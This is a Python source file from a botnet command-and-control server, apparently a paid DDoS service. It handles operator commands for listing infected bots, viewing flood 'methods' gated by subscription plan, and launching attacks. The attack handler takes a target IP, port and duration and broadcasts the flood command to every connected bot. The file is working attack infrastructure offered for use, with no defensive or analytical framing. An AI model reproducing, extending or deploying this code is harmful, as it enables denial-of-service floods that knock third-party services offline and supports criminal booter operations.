from colorama import Fore
from src.database.database import get_user, update_user_attack_count, is_method_allowed
from src.methods.methods import botnetMethodsName, isBotnetMethod
from src.commands.commands import handle_admin_commands
from src.utils.ui import colorize_text_gradient, ANSI_CLEAR, COLORS
from src.utils.security import sanitize_log, sanitize_command

class CommandHandler:
    def __init__(self, server):
        self.server = server
    
    def handle(self, client, username, session_token, data):
        gray = Fore.LIGHTBLACK_EX
        white = Fore.LIGHTWHITE_EX
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        yellow = Fore.LIGHTYELLOW_EX
        blue = Fore.LIGHTBLUE_EX
        
        if len(data) > self.server.max_data_len:
            self.server.send(client, f'{red}Command too long\n')
            return True
        
        args = data.split(' ')
        command = args[0].upper()
        
        self.server.send(client, ANSI_CLEAR, False)
        for line in self.server.banner.split('\n'):
            self.server.send(client, line)
        
        if command.startswith('!'):
            handle_admin_commands(command, args, client, self.server.send, username)
            return True
        
        if command in ['HELP', '?', 'COMMANDS']:
            self._handle_help(client, gray, white)
        
        elif command == 'BOTNET':
            self._handle_botnet(client, username, white, yellow, red)
        
        elif command in ['BOTS', 'ZOMBIES']:
            self._handle_bots(client)
        
        elif command == 'STOP':
            self._handle_stop(client, username, gray, white)
        
        elif command in ['OWNER', 'CREDITS']:
            self._handle_owner(client, blue, gray)
        
        elif command in ['CLEAR', 'CLS']:
            self._handle_clear(client, username)
        
        elif command in ['LOGOUT', 'QUIT', 'EXIT', 'BYE']:
            self._handle_logout(client, blue)
            return False
        
        elif isBotnetMethod(command):
            return self._handle_attack(client, username, command, args, gray, white, yellow, green, red)
        else:
            self.server.send(client, f'{red}{command} not found!\n')
        
        return True
    
    def _handle_help(self, client, gray, white):
        self.server.send(client, colorize_text_gradient('Commands:           Description:'))
        self.server.send(client, f'{white}HELP{gray}                Shows list of commands')
        self.server.send(client, f'{white}BOTNET{gray}              Shows list of botnet attack methods')
        self.server.send(client, f'{white}BOTS{gray}                Shows all conected bots')
        self.server.send(client, f'{white}STOP{gray}                Stop all your floods in progress')
        self.server.send(client, f'{white}CLEAR{gray}               Clears the screen')
        self.server.send(client, f'{white}OWNER{gray}               Shows owner information')
        self.server.send(client, f'{white}LOGOUT{gray}              Disconnects from C&C server\n')
    
    def _handle_botnet(self, client, username, white, yellow, red):
        botnetMethods = botnetMethodsName('ALL')
        self.server.send(client, colorize_text_gradient('Botnet Methods:'))
        
        user_data = get_user(username)
        for method, desc in botnetMethods.items():
            method_name = method[1:] if method.startswith('.') else method
            method_available = is_method_allowed(username, method_name)
            
            if method_available:
                self.server.send(client, f"{white}{method} {yellow}{desc}")
            else:
                self.server.send(client, f"{white}{method} {yellow}{desc} {red}[Upgrade Required]")
        
        self.server.send(client, '')
    
    def _handle_bots(self, client):
        self.server.send(client, ANSI_CLEAR, False)
        for line in self.server.banner.split('\n'):
            self.server.send(client, line)
        self.server.bot_manager.list_architectures(client, self.server.send)
    
    def _handle_stop(self, client, username, gray, white):
        import logging
        if self.server.attack_manager.stop(username):
            self.server.broadcast('STOP', username)
            self.server.send(client, f'\n{gray}> {white}Your flooding has been successfully stopped.\n')
            logging.info(f"Ataque de {sanitize_log(username)} parado manualmente")
        else:
            self.server.send(client, f'\n{gray}> {white}You have no floods in progress.\n')
    
    def _handle_owner(self, client, blue, gray):
        self.server.send(client, f'\n{blue}Instagram{gray}: {COLORS["Q"]}cirqueirax')
        self.server.send(client, f'{blue}Telegram{gray}: {COLORS["Q"]}Cirqueiraz')
        self.server.send(client, f'{blue}Discord{gray}: {COLORS["Q"]}cirqueira')
        self.server.send(client, f'{blue}GitHub{gray}: {COLORS["Q"]}CirqueiraDev\n')
    
    def _handle_clear(self, client, username):
        self.server.send(client, ANSI_CLEAR, False)
        user_data = get_user(username)
        self.server.return_banner(client, username, user_data)
    
    def _handle_logout(self, client, blue):
        self.server.send(client, f'\n{blue}America ya!\n')
        import time
        time.sleep(1)
    
    def _handle_attack(self, client, username, command, args, gray, white, yellow, green, red):
        method_name = command[1:] if command.startswith('.') else command
        if not is_method_allowed(username, method_name):
            self.server.send(client, f'{red}This method is not available in your plan. Upgrade to use it.\n')
            return True
        
        if len(args) != 4:
            self.server.send(client, f'Usage: {gray}{command} [IP] [PORT] [TIME]\n')
            return True
        
        ip = args[1]
        port = args[2]
        secs = args[3]
        
        if not self.server.attack_manager.can_launch(ip, port, secs, username, client):
            return True
        
        attack_info = f'''
{gray}> {white}Method   {gray}: {yellow}{botnetMethodsName(command).strip()}{gray}
{gray}> {white}Target   {gray}: {white}{ip}{gray}
{gray}> {white}Port     {gray}: {white}{port}{gray}
{gray}> {white}Duration {gray}: {white}{secs}{gray}
        '''
        for line in attack_info.split('\n'):
            self.server.send(client, line)
        
        sanitized_cmd = sanitize_command(command)
        self.server.broadcast(f'{sanitized_cmd} {ip} {port} {secs}', username)
        
        bots_count = self.server.bot_manager.get_count()
        self.server.send(client, f'{green} Attack sent to {bots_count} bots\n')
        
        self.server.attack_manager.launch(username, ip, port, secs, command)
        update_user_attack_count(username)
        
        return True

